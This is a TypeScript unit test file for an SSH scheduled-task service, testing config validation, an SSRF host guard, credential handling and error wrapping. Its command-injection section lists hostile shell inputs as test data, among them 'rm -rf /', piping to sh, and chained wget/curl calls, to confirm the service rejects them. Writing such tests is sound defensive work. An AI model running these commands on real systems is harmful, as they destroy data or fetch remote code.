/**
 * Unit tests for the SSH Daily Task Service.
 *
 * Coverage:
 *   – validateSshConfig: required fields, port range, SSRF host guard
 *   – runSshTask: missing credentials, DNS-level SSRF guard, successful
 *     execution, command failure, executor errors, log sanitization,
 *     error message wrapping
 *
 * All tests use an injected SshExecutor mock and ssrfCheck stub — no real
 * SSH daemon or DNS lookup is required.
 */

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest'
import { runSshTask } from '../server/src/services/ssh'
import type { SshExecutor, SshRunnerOptions, SshExecResult } from '../server/src/services/ssh'
import type { DailyTask } from '../server/src/types'

// ── Fixtures ──────────────────────────────────────────────────────────────────

function makeTask(configOverrides: Record<string, string> = {}): DailyTask {
  return {
    id: 'task-ssh-001',
    name: 'SSH Check',
    description: 'Run uptime on remote server',
    type: 'daily',
    status: 'idle',
    schedule: '0 9 * * *',
    actionType: 'ssh',
    config: {
      host: 'example.com',
      port: '22',
      username: 'deploy',
      command: 'uptime',
      ...configOverrides,
    },
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
  }
}

function makeExecutor(result: SshExecResult | Error = { stdout: '', stderr: '', exitCode: 0 }): SshExecutor {
  return {
    exec: vi.fn().mockImplementation(() =>
      result instanceof Error ? Promise.reject(result) : Promise.resolve(result),
    ),
  }
}

/**
 * Default options for tests that exercise executor behaviour (not SSRF).
 * Passes a no-op ssrfCheck so tests don't make real DNS lookups.
 */
function makeOptions(
  executor: SshExecutor,
  ssrfCheck: SshRunnerOptions['ssrfCheck'] = async () => true,
): SshRunnerOptions {
  return { executor, ssrfCheck }
}

// ── Environment helpers ───────────────────────────────────────────────────────

function withSshKey(fn: () => unknown): unknown {
  const orig = process.env['SSH_PRIVATE_KEY']
  process.env['SSH_PRIVATE_KEY'] = '-----BEGIN RSA PRIVATE KEY-----\nfake\n-----END RSA PRIVATE KEY-----'
  try {
    return fn()
  } finally {
    if (orig === undefined) delete process.env['SSH_PRIVATE_KEY']
    else process.env['SSH_PRIVATE_KEY'] = orig
  }
}

function withSshPassword(fn: () => unknown): unknown {
  const origKey = process.env['SSH_PRIVATE_KEY']
  const origPass = process.env['SSH_PASSWORD']
  delete process.env['SSH_PRIVATE_KEY']
  process.env['SSH_PASSWORD'] = 'secret-pass'
  try {
    return fn()
  } finally {
    if (origKey === undefined) delete process.env['SSH_PRIVATE_KEY']
    else process.env['SSH_PRIVATE_KEY'] = origKey
    if (origPass === undefined) delete process.env['SSH_PASSWORD']
    else process.env['SSH_PASSWORD'] = origPass
  }
}

beforeEach(() => {
  delete process.env['SSH_PRIVATE_KEY']
  delete process.env['SSH_KEY_PASSPHRASE']
  delete process.env['SSH_PASSWORD']
})

afterEach(() => {
  delete process.env['SSH_PRIVATE_KEY']
  delete process.env['SSH_KEY_PASSPHRASE']
  delete process.env['SSH_PASSWORD']
})

// ═════════════════════════════════════════════════════════════════════════════
// Config validation
// ═════════════════════════════════════════════════════════════════════════════

describe('runSshTask – config validation', () => {
  it('returns failure when host is missing', async () => {
    const task = makeTask({ host: '' })
    const result = await runSshTask(task)
    expect(result.success).toBe(false)
    expect(result.error).toMatch(/host/i)
  })

  it('returns failure when username is missing', async () => {
    const task = makeTask({ username: '' })
    const result = await runSshTask(task)
    expect(result.success).toBe(false)
    expect(result.error).toMatch(/username/i)
  })

  it('returns failure when command is missing', async () => {
    const task = makeTask({ command: '' })
    const result = await runSshTask(task)
    expect(result.success).toBe(false)
    expect(result.error).toMatch(/command/i)
  })

  it('returns failure for an invalid port (string)', async () => {
    const task = makeTask({ port: 'abc' })
    const result = await runSshTask(task)
    expect(result.success).toBe(false)
    expect(result.error).toMatch(/port/i)
  })

  it('returns failure for port 0', async () => {
    const task = makeTask({ port: '0' })
    const result = await runSshTask(task)
    expect(result.success).toBe(false)
    expect(result.error).toMatch(/port/i)
  })

  it('returns failure for port > 65535', async () => {
    const task = makeTask({ port: '70000' })
    const result = await runSshTask(task)
    expect(result.success).toBe(false)
    expect(result.error).toMatch(/port/i)
  })

  it('accepts the default port when not specified', async () => {
    // Remove port from config — should default to 22 without error
    const task = makeTask()
    delete (task.config as Record<string, string>)['port']
    process.env['SSH_PRIVATE_KEY'] = 'fake-key'
    const executor = makeExecutor({ stdout: 'ok', stderr: '', exitCode: 0 })
    const result = await runSshTask(task, makeOptions(executor))
    // Default port 22 should be accepted — expect overall success
    expect(result.success).toBe(true)
  })
})

// ═════════════════════════════════════════════════════════════════════════════
// Command injection prevention
// ═════════════════════════════════════════════════════════════════════════════

describe('runSshTask – command injection prevention', () => {
  const injectionCases: Array<{ label: string; command: string }> = [
    { label: 'semicolon separator',       command: 'uptime; rm -rf /'     },
    { label: 'pipe to shell',             command: 'uptime | sh'          },
    { label: 'background operator',       command: 'uptime & wget evil'   },
    { label: 'logical AND',               command: 'true && rm -rf /'     },
    { label: 'logical OR',                command: 'false || curl evil'   },
    { label: 'backtick substitution',     command: 'uptime `id`'          },
    { label: 'dollar subshell',           command: 'uptime $(id)'         },
    { label: 'variable expansion',        command: 'echo $HOME'           },
    { label: 'backslash escape',          command: 'uptime\\; rm -rf /'   },
    { label: 'output redirection',        command: 'uptime > /etc/passwd' },
    { label: 'input redirection',         command: 'cat < /etc/passwd'    },
    { label: 'exclamation history',       command: '!!rm -rf /'           },
    { label: 'brace expansion',           command: 'uptime{;rm,-rf,/}'    },
    { label: 'newline injection',         command: 'uptime\nrm -rf /'     },
    { label: 'carriage return injection', command: 'uptime\rrm -rf /'     },
  ]

  for (const { label, command } of injectionCases) {
    it(`blocks command with ${label}`, async () => {
      const task = makeTask({ command })
      const result = await runSshTask(task)
      expect(result.success).toBe(false)
      expect(result.error).toMatch(/forbidden shell metacharacter/i)
    })
  }

  it('does not pass injected commands to the executor', async () => {
    process.env['SSH_PRIVATE_KEY'] = 'fake-key'
    const task = makeTask({ command: 'uptime; evil' })
    const executor = makeExecutor({ stdout: '', stderr: '', exitCode: 0 })
    await runSshTask(task, makeOptions(executor))
    expect(executor.exec).not.toHaveBeenCalled()
  })

  it('allows safe commands with common monitoring operators', async () => {
    process.env['SSH_PRIVATE_KEY'] = 'fake-key'
    const safeCmds = [
      'uptime',
      'df -h',
      'ls /var/log',
      'systemctl status nginx',
      'cat /etc/hostname',
      'ps aux',
      'free -m',
      'hostname -f',
      'netstat -tlnp',
      'tail -n 20 /var/log/syslog',
    ]
    for (const cmd of safeCmds) {
      const task = makeTask({ command: cmd })
      const executor = makeExecutor({ stdout: 'ok', stderr: '', exitCode: 0 })
      const result = await runSshTask(task, makeOptions(executor))
      expect(result.success).toBe(true)
      expect(executor.exec).toHaveBeenCalledOnce()
      vi.clearAllMocks()
    }
  })
})

// ═════════════════════════════════════════════════════════════════════════════
// SSRF guard
// ═════════════════════════════════════════════════════════════════════════════

describe('runSshTask – SSRF guard', () => {
  it('blocks localhost', async () => {
    const task = makeTask({ host: 'localhost' })
    const result = await runSshTask(task)
    expect(result.success).toBe(false)
    expect(result.error).toMatch(/not allowed/i)
  })

  it('blocks 127.0.0.1', async () => {
    const task = makeTask({ host: '127.0.0.1' })
    const result = await runSshTask(task)
    expect(result.success).toBe(false)
    expect(result.error).toMatch(/not allowed/i)
  })

  it('blocks 10.0.0.1 (RFC 1918)', async () => {
    const task = makeTask({ host: '10.0.0.1' })
    const result = await runSshTask(task)
    expect(result.success).toBe(false)
    expect(result.error).toMatch(/not allowed/i)
  })

  it('blocks 192.168.1.100 (RFC 1918)', async () => {
    const task = makeTask({ host: '192.168.1.100' })
    const result = await runSshTask(task)
    expect(result.success).toBe(false)
    expect(result.error).toMatch(/not allowed/i)
  })

  it('blocks 172.16.0.1 (RFC 1918)', async () => {
    const task = makeTask({ host: '172.16.0.1' })
    const result = await runSshTask(task)
    expect(result.success).toBe(false)
    expect(result.error).toMatch(/not allowed/i)
  })

  it('blocks .local domains', async () => {
    const task = makeTask({ host: 'myserver.local' })
    const result = await runSshTask(task)
    expect(result.success).toBe(false)
    expect(result.error).toMatch(/not allowed/i)
  })

  it('allows a public hostname (passes both static and DNS checks)', async () => {
    process.env['SSH_PRIVATE_KEY'] = 'fake-key'
    const task = makeTask({ host: 'example.com' })
    const executor = makeExecutor({ stdout: '', stderr: '', exitCode: 0 })
    // ssrfCheck mock returns true → public hostname passes DNS check
    await runSshTask(task, makeOptions(executor))
    // Executor must have been reached (SSRF did not block)
    expect(executor.exec).toHaveBeenCalled()
  })

  it('blocks a hostname that passes static check but resolves to a private IP (DNS rebinding)', async () => {
    process.env['SSH_PRIVATE_KEY'] = 'fake-key'
    const task = makeTask({ host: 'evil.example.com' })
    const executor = makeExecutor({ stdout: '', stderr: '', exitCode: 0 })
    // Simulate DNS rebinding: ssrfCheck returns false (resolved to private IP)
    const ssrfCheck = vi.fn().mockResolvedValue(false)
    const result = await runSshTask(task, { executor, ssrfCheck })
    expect(result.success).toBe(false)
    expect(result.error).toMatch(/private or disallowed/i)
    expect(executor.exec).not.toHaveBeenCalled()
  })

  it('returns failure when DNS resolution throws', async () => {
    process.env['SSH_PRIVATE_KEY'] = 'fake-key'
    const task = makeTask({ host: 'nonexistent.example.com' })
    const executor = makeExecutor({ stdout: '', stderr: '', exitCode: 0 })
    const ssrfCheck = vi.fn().mockRejectedValue(new Error('DNS lookup failed'))
    const result = await runSshTask(task, { executor, ssrfCheck })
    expect(result.success).toBe(false)
    expect(result.error).toMatch(/DNS resolution failed/i)
    expect(executor.exec).not.toHaveBeenCalled()
  })
})

// ═════════════════════════════════════════════════════════════════════════════
// Credential checks
// ═════════════════════════════════════════════════════════════════════════════

describe('runSshTask – credential handling', () => {
  it('returns failure when no SSH credentials are configured', async () => {
    const task = makeTask()
    const executor = makeExecutor()
    // Credential check happens before DNS lookup — no need for ssrfCheck here
    const result = await runSshTask(task, { executor })
    expect(result.success).toBe(false)
    expect(result.error).toMatch(/credentials/i)
    expect(executor.exec).not.toHaveBeenCalled()
  })

  it('proceeds when SSH_PRIVATE_KEY is set', async () => {
    process.env['SSH_PRIVATE_KEY'] = 'fake-key-content'
    const task = makeTask()
    const executor = makeExecutor({ stdout: 'all good', stderr: '', exitCode: 0 })
    const result = await runSshTask(task, makeOptions(executor))
    expect(executor.exec).toHaveBeenCalledOnce()
    expect(result.success).toBe(true)
  })

  it('proceeds when SSH_PASSWORD is set (no private key)', async () => {
    process.env['SSH_PASSWORD'] = 's3cr3t'
    const task = makeTask()
    const executor = makeExecutor({ stdout: 'ok', stderr: '', exitCode: 0 })
    const result = await runSshTask(task, makeOptions(executor))
    expect(executor.exec).toHaveBeenCalledOnce()
    expect(result.success).toBe(true)
  })

  it('prefers SSH_PRIVATE_KEY over SSH_PASSWORD when both are set', async () => {
    process.env['SSH_PRIVATE_KEY'] = 'key-content'
    process.env['SSH_PASSWORD'] = 'password-content'
    const task = makeTask()
    const capturedConfigs: { privateKey?: string; password?: string }[] = []
    const executor: SshExecutor = {
      exec: vi.fn().mockImplementation((cfg) => {
        capturedConfigs.push({ privateKey: cfg.privateKey, password: cfg.password })
        return Promise.resolve({ stdout: '', stderr: '', exitCode: 0 })
      }),
    }
    await runSshTask(task, makeOptions(executor))
    expect(capturedConfigs[0]?.privateKey).toBe('key-content')
    expect(capturedConfigs[0]?.password).toBeUndefined()
  })

  it('does not include credentials in logs', async () => {
    process.env['SSH_PRIVATE_KEY'] = 'SUPER_SECRET_KEY'
    process.env['SSH_PASSWORD'] = 'SUPER_SECRET_PASS'
    const task = makeTask()
    const executor = makeExecutor({ stdout: '', stderr: '', exitCode: 0 })
    const result = await runSshTask(task, makeOptions(executor))
    const allLogs = result.logs.join('\n')
    expect(allLogs).not.toContain('SUPER_SECRET_KEY')
    expect(allLogs).not.toContain('SUPER_SECRET_PASS')
  })
})

// ═════════════════════════════════════════════════════════════════════════════
// Successful execution
// ═════════════════════════════════════════════════════════════════════════════

describe('runSshTask – successful execution', () => {
  beforeEach(() => {
    process.env['SSH_PRIVATE_KEY'] = 'fake-key'
  })

  it('returns success when exit code is 0', async () => {
    const task = makeTask()
    const executor = makeExecutor({ stdout: ' 9:00AM up 42 days', stderr: '', exitCode: 0 })
    const result = await runSshTask(task, makeOptions(executor))
    expect(result.success).toBe(true)
    expect(result.error).toBeUndefined()
  })

  it('includes stdout in logs', async () => {
    const task = makeTask()
    const executor = makeExecutor({ stdout: 'hello world\nline2', stderr: '', exitCode: 0 })
    const result = await runSshTask(task, makeOptions(executor))
    const combined = result.logs.join('\n')
    expect(combined).toContain('hello world')
    expect(combined).toContain('line2')
  })

  it('includes stderr in logs', async () => {
    const task = makeTask()
    const executor = makeExecutor({ stdout: '', stderr: 'warning: something', exitCode: 0 })
    const result = await runSshTask(task, makeOptions(executor))
    const combined = result.logs.join('\n')
    expect(combined).toContain('warning: something')
  })

  it('includes the exit code in logs', async () => {
    const task = makeTask()
    const executor = makeExecutor({ stdout: '', stderr: '', exitCode: 0 })
    const result = await runSshTask(task, makeOptions(executor))
    expect(result.logs.join('\n')).toContain('exited with code 0')
  })

  it('passes the correct host, port, and username to the executor', async () => {
    const task = makeTask({ host: 'prod.example.com', port: '2222', username: 'admin' })
    const captured: Parameters<SshExecutor['exec']>[0][] = []
    const executor: SshExecutor = {
      exec: vi.fn().mockImplementation((cfg) => {
        captured.push(cfg)
        return Promise.resolve({ stdout: '', stderr: '', exitCode: 0 })
      }),
    }
    await runSshTask(task, makeOptions(executor))
    expect(captured[0]?.host).toBe('prod.example.com')
    expect(captured[0]?.port).toBe(2222)
    expect(captured[0]?.username).toBe('admin')
  })

  it('passes the command to the executor', async () => {
    const task = makeTask({ command: 'df -h' })
    const capturedCommands: string[] = []
    const executor: SshExecutor = {
      exec: vi.fn().mockImplementation((_cfg, cmd) => {
        capturedCommands.push(cmd)
        return Promise.resolve({ stdout: '', stderr: '', exitCode: 0 })
      }),
    }
    await runSshTask(task, makeOptions(executor))
    expect(capturedCommands[0]).toBe('df -h')
  })
})

// ═════════════════════════════════════════════════════════════════════════════
// Command failure
// ═════════════════════════════════════════════════════════════════════════════

describe('runSshTask – command failure', () => {
  beforeEach(() => {
    process.env['SSH_PRIVATE_KEY'] = 'fake-key'
  })

  it('returns failure when exit code is non-zero', async () => {
    const task = makeTask()
    const executor = makeExecutor({ stdout: '', stderr: 'permission denied', exitCode: 1 })
    const result = await runSshTask(task, makeOptions(executor))
    expect(result.success).toBe(false)
    expect(result.error).toMatch(/exit code 1/)
  })

  it('includes the task ID in the error message', async () => {
    const task = makeTask()
    const executor = makeExecutor({ stdout: '', stderr: '', exitCode: 2 })
    const result = await runSshTask(task, makeOptions(executor))
    expect(result.error).toContain('task-ssh-001')
  })

  it('logs both stdout and stderr on failure', async () => {
    const task = makeTask()
    const executor = makeExecutor({ stdout: 'partial output', stderr: 'error occurred', exitCode: 127 })
    const result = await runSshTask(task, makeOptions(executor))
    const combined = result.logs.join('\n')
    expect(combined).toContain('partial output')
    expect(combined).toContain('error occurred')
  })

  it('handles null exit code gracefully', async () => {
    const task = makeTask()
    const executor = makeExecutor({ stdout: '', stderr: '', exitCode: null })
    const result = await runSshTask(task, makeOptions(executor))
    expect(result.success).toBe(false)
    expect(result.error).toMatch(/unknown/)
  })
})

// ═════════════════════════════════════════════════════════════════════════════
// Executor errors (connection failures)
// ═════════════════════════════════════════════════════════════════════════════

describe('runSshTask – executor errors', () => {
  beforeEach(() => {
    process.env['SSH_PRIVATE_KEY'] = 'fake-key'
  })

  it('returns failure when executor throws', async () => {
    const task = makeTask()
    const executor = makeExecutor(new Error('SSH connection failed'))
    const result = await runSshTask(task, makeOptions(executor))
    expect(result.success).toBe(false)
    expect(result.error).toBeDefined()
  })

  it('wraps executor errors with task context', async () => {
    const task = makeTask()
    const executor = makeExecutor(new Error('SSH connection failed'))
    const result = await runSshTask(task, makeOptions(executor))
    expect(result.error).toContain('task-ssh-001')
  })

  it('includes the error message in logs', async () => {
    const task = makeTask()
    const executor = makeExecutor(new Error('SSH connection failed'))
    const result = await runSshTask(task, makeOptions(executor))
    expect(result.logs.join('\n')).toContain('SSH connection failed')
  })

  it('handles non-Error rejections', async () => {
    const task = makeTask()
    const executor: SshExecutor = {
      exec: vi.fn().mockRejectedValue('raw string error'),
    }
    const result = await runSshTask(task, makeOptions(executor))
    expect(result.success).toBe(false)
    expect(result.error).toBeDefined()
  })
})
